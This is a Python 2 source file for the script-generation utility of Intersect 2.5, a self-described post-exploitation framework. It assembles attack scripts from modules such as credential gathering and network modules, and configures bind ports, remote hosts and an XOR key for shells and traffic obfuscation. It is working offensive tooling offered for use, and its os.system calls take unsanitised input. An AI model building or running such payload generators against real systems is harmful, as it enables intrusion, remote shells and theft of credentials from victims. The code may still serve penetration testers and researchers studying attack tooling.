#!/usr/bin/python

# Intersect2 Payload Generation Utility
# copyright 2012 - ohdae
# bindshell labs - http://bindshell.it.cx

import sys, os, re
import shutil
import string, socket
import linecache
import random

global ModulesDir
global CustomDir
global PayloadTemplate
global currentloc

currentloc = os.getcwd()
ModulesDir = (currentloc+"/src/Modules/Standard/")
CustomDir = (currentloc+"/src/Modules/Custom/")
PayloadTemplate = (currentloc+"/src/Templates/stock-template")

def banner():
    print """                         
           _____       _                          _     ___    _____ 
          |_   _|     | |   bindshell.it.cx      | |   |__ \  | ____|
            | |  _ __ | |_ ___ _ __ ___  ___  ___| |_     ) | | |__  
            | | | '_ \| __/ _ \ '__/ __|/ _ \/ __| __|   / /  |___ \ 
           _| |_| | | | ||  __/ |  \__ \  __/ (__| |_   / /_ _ ___) |
          |_____|_| |_|\__\___|_|  |___/\___|\___|\__| |____(_)____/ 

   		Intersect 2.5 - Post-Exploitation Framework
"""


class payloadgen(object):
  def __init__(self):
    self.header = " => "
    self.warning = "[+] "
    
  def core(self):
    print """
Intersect 2.5 - Script Creation Utility
------------------------------------------
1 => Create Custom Script
2 => List Available Modules
3 => Load Plugin Module
4 => Exit Creation Utility\n\n"""
    while True:
        choice = raw_input("%s " % (self.header))

        if choice == '1':
            self.create()

        elif choice == '2':
            print("\nIntersect 2.5 - Script Creation Utility")
            print("------- List of Intersect Modules --------\n")
            print("Standard Modules: ")
            os.system("ls %s" % ModulesDir)
            print("\nCustom Modules: ")
            os.system("ls %s" % CustomDir)
            print("-------------------------------------------")
            print(" 1 => Return to main menu.")
            choice = raw_input("%s " % (self.header))
            if choice == '1':
                os.system("clear")
                banner()
                self.core()
            else:
                print("%sInvalid Selection!" % (self.warning))

        elif choice == '3':
            self.loadfunc()

        elif choice == '4':
            print("Exiting. See ya later!")
            sys.exit(0)

  def loadfunc(self):
      print("\n----------- Load Plugin Modules ------------")
      print("")
      print(" Options:")    
      print("1 => Load module by filename")
      print("2 => List currently loaded custom modules")
      print("3 => Return to Main Menu")

      choice = raw_input("%s " % (self.header))

      if choice == '1':
          print("Enter the current location of your custom module: ")
          modloc = raw_input("%s " % (self.header))

          if os.path.exists(modloc) is True:
              shutil.copy2(modloc, CustomDir)
              print("[+] Module successfully loaded into the custom modules directory!")
              self.loadfunc()

          else:
              print("[!] Custom module could not be loaded.")

      elif choice == '2':
          print("Currently available custom modules: ")
          os.system("ls %s" % CustomDir)
          self.loadfunc()

      elif choice == '3':
          os.system("clear")
          banner()
          self.core()

  def create(self):
      os.system("clear")
      print("\nIntersect 2.0 - Script Generation Utility")
      print("---------- Create Custom Script -----------\n")
      print(" Instructions: ")
      print("""
Use the console below to create your custom
Intersect script. Type the modules you wish 
to add, pressing [enter] after each module. 
Example:
 => creds
 => network

When you have entered all your desired modules
into the queue, start the build process by typing :create. 

** To view a full list of all available commands type :help.
The command :quit will return you to the main menu.\n""")

      desired_modules = []

      while 1:

          modulesInput = raw_input("%s " % (self.header))

          if os.path.exists(ModulesDir+modulesInput) is True:
              desired_modules.append(modulesInput)
              print ("%s added to queue.\n" % modulesInput)

          elif os.path.exists(CustomDir+modulesInput) is True:
              desired_modules.append(modulesInput)
              print ("%s added to queue.\n" % modulesInput)
              
          elif modulesInput == ":modules":
              os.system("ls %s" % ModulesDir)
              os.system("ls %s" % CustomDir)

          elif modulesInput == ":create":
              createcustom.chooseName()
              payloadgen.globalconfig(desired_modules)
              for mod in desired_modules:
                  print mod
              createcustom.CombineFeatures(desired_modules)

          elif modulesInput.startswith(":info"):
              getname = modulesInput.split(' ')
              modname = getname[1]

              if os.path.exists(CustomDir+modname) is True:
                  info = open(CustomDir+modname)
                  for line in info:
                      if "__description__" in line:
                          split = line.split("=")
                          des = split[1]
                          print("\nDescription: %s " % des)
                      if "__author__" in line:
                          split = line.split("=")
                          author = split[1]
                          print("Author: %s " % author)

              elif os.path.exists(ModulesDir+modname) is True:
                  info = open(ModulesDir+modname)
                  for line in info:
                      if "__description__" in line:
                          split = line.split("=")
                          des = split[1]
                          print("\nDescription: %s " % des)
                      if "__author__" in line:
                          split = line.split("=")
                          author = split[1]
                          print("Author: %s " % author)
              else:
                  print("No description given for %s module " % modname)


          elif modulesInput.startswith(":rem"):
              getname = modulesInput.split(' ')
              modname = getname[1]
              desired_modules.remove(modname)
              print("[+] Removed module %s from queue" % modname)

          elif modulesInput == ":active":
              print("\nModules you have selected: ")
              print desired_modules

          elif modulesInput == ":clear":
              os.system("clear")
              print("Intersect 2.5 - Script Creation Utility")

          elif modulesInput == ":help":
              print("\n  Available Commands:")
              print("         :help  =>  display this menu")
              print("       :active  =>  shows current module queue")
              print("       :create  =>  creates payload from selected list")
              print("        :clear  =>  clears the screen")
              print("  :info module  =>  show description of module")
              print("      :modules  =>  list of currently available modules")
              print("        module  =>  adds module to payload queue")
              print("   :rem module  =>  removes module from payload queue")
              print("         :quit  =>  return to the main menu")

          elif modulesInput == ":quit":
              print("[+] Returning to the main menu....")
              banner()
              self.core()  
          else:
              print("[!] %s command or module does not seem to exist!\n" % modulesInput)

  def valid_ip(self,ip):
      parts = ip.split('.')
      return (
          len(parts) == 4
          and all(part.isdigit() for part in parts)
          and all(0 <= int(part) <= 255 for part in parts)
          )

  def globalconfig(self, modules):
      print("\nSet shell options\nIf any of these options don't apply to you, press [enter] to ignore them.")
      writeglobals = (currentloc+"/Junk/globals")
      globalstemp = open(writeglobals, "a")

      globalstemp.write("\ndef globalvars():")
      globalstemp.write("\n    global PORT")
      globalstemp.write("\n    global RHOST")
      globalstemp.write("\n    global RPORT")
      globalstemp.write("\n    global PPORT")
      globalstemp.write("\n    global PKEY")
      globalstemp.write("\n    global modList")

      globalstemp.write("\n\n    modList = %s" % modules)

      bport = raw_input("bind port %s " % (self.header))
      if bport == "":
          globalstemp.write("\n    PORT = 8888")
      elif bport.isdigit() is True:
          globalstemp.write("\n    PORT = %s" % bport)
          print("[+] bind port saved.")
      else:
          print("[!] invalid port!")
          os.system("rm %s" % writeglobals)
          self.globalconfig()

      rhost = raw_input("remote host %s " % (self.header))
      if rhost == "":
          globalstemp.write("\n    RHOST = ''")
      elif self.valid_ip(rhost) is True:
          globalstemp.write("\n    RHOST = '%s'" % rhost)
          print("[+] remote host saved.")
      else:
          print("[!] invalid ipv4 address!")
          os.system("rm %s" % writeglobals)
          self.globalconfig()

      rport = raw_input("remote port %s " % (self.header))
      if rport == "":
          globalstemp.write("\n    RPORT = 8888")
      elif rport.isdigit() is True:
          globalstemp.write("\n    RPORT = %s" % rport)
          print("[+] remote port saved.")
      else:
          print("[!] invalid port!")
          os.system("rm %s" % writeglobals)
          self.globalconfig()

      pport = raw_input("proxy port %s " % (self.header))
      if pport == "":
          globalstemp.write("\n    PPORT = 8080")
      elif pport.isdigit() is True:
          globalstemp.write("\n    PPORT = %s" % pport)
          print("[+] proxy port saved.")
      else:
          print("[!] invalid port!")
          os.system("rm %s" % writeglobals)
          self.globalconfig()

      pkey = raw_input("xor cipher key %s " % (self.header))
      if pkey == "":
          globalstemp.write("\n    PKEY = 'KXYRTUX'")
      else:
          globalstemp.write("\n    PKEY = '%s'\n\n" % pkey)
          print("[+] xor key saved.")

      globalstemp.close()



class createcustom:
  def __init__(self):
    self.header = " => "


  def chooseName(self):
      global newpayload
      global script

      if os.path.exists(PayloadTemplate) is True:
          print("Enter a name for your Intersect script. The finished script will be placed in the Scripts directory. Do not include Python file extension.")
          name = raw_input("%s " % (self.header))
          script = (currentloc+"/Scripts/%s.py" % name)

          if os.path.exists(script) is True:
              print("[!] The filename you entered all ready exists. Enter a new filename")
              self.chooseName()
          else: 
              shutil.copy2(PayloadTemplate, script)
              newpayload = open(script, "a")
              print("Script will be saved as %s" % script)

      else:
          print("[!] Payload template cannot be found!")
          payloadgen.core()


  def CombineFeatures(self, moduleList):


      savedglobals = (currentloc+"/Junk/globals")
      writeglobals = open(savedglobals, "r")
      for lines in writeglobals.readlines():
          newpayload.write(lines)
      writeglobals.close()
      os.system("rm %s" % savedglobals)

      for item in moduleList:
          if os.path.exists(ModulesDir+item) is True:
              module = open(ModulesDir+item, "r")

          elif os.path.exists(CustomDir+item) is True:
              module = open(CustomDir+item, "r")

          for lines in module.readlines():
              newpayload.write(lines)
              module.close()

      newpayload.close()

      self.MakeUsage(moduleList)
      self.MakeOptParse(moduleList)
      os.system("chmod u+x %s" % script)

      print("\n[+] Your custom Intersect script has been created!")
      print("   Location: %s" % script)
      sys.exit(0)

      
  def MakeUsage(self, moduleList):  # Clean up this function
      usage = (currentloc+"/Junk/usage")
      writeusage = open(usage, "a")

      writeusage.write("\n\ndef usage():")
      writeusage.write("\n    print('============================================')")
      writeusage.write("\n    print('   intersect 2.5 | custom version     ')")
      writeusage.write("\n    print('      http://bindshell.it.cx | ohdae')")
      writeusage.write("\n    print(' Modules:')")

      for module in moduleList:
          short = module[0]
          writeusage.write("\n    print('     -%s   --%s')" % (short, module))

      writeusage.close()

      newpayload = open(script, "a")
      addusage = open(usage, "r")
    
      for lines in addusage.readlines():
          newpayload.write(lines)

      os.system("rm %s" % usage)
      newpayload.close()
      addusage.close()


  def MakeOptParse(self, moduleList):
      shortopts = []
      shorts = []
      
      for item in moduleList:
          modname = item[0]
          shortopts.append(modname)

      moduleList.append("help")
      shorts.append("h")

      shorts = [''.join(shortopts)]
    
      
      newpayload = open(script, "a")
      writeopts = (currentloc+"/Junk/writeopts") # give name to getopt temporary file # 
      newopts = open(writeopts, "a") # open temporary getopt file to append getopt functions into

      
      newopts.write("\n\ndef main(argv):")
      newopts.write("\n    try:")
      newopts.write("\n        opts, args = getopt.getopt(sys.argv[1:], %s, %s)" % (str(shorts).strip('[]'), moduleList))
      newopts.write("\n    except getopt.GetoptError, err:")
      newopts.write("\n        print str(err)")
      newopts.write("\n        Shutdown()")
      newopts.write("\n    for o, a in opts:")
      newopts.write("\n        if o in ('-h', '--help'):")
      newopts.write("\n            usage()")
      newopts.write("\n            Shutdown()")
      newopts.write("\n            sys.exit(2)")
      
      for opt, module in zip(shortopts, moduleList):
          newopts.write("\n        elif o in ('-%s', '--%s'):" % (opt, module))
          newopts.write("\n            %s()" % module)

      newopts.write("\n        else:")
      newopts.write("\n            assert False, 'unhandled option'")
      newopts.write("\n    Shutdown()\n")
      newopts.write("\n\nglobalvars()")
      newopts.write("\nenvironment()")
      newopts.write('\nif __name__ == "__main__":')
      newopts.write("\n    if len(sys.argv) <=1:")
      newopts.write("\n        usage()")
      newopts.write("\n    main(sys.argv[1:])")
      newopts.close()

      writeopt = open(writeopts, "r")
      for lines in writeopt.readlines():
          newpayload.write(lines)

      os.system("rm %s" % writeopts)

      writeopt.close()
      newpayload.close()         


if __name__=='__main__':
  banner()
  payloadgen = payloadgen()
  createcustom = createcustom()
  payloadgen.core()

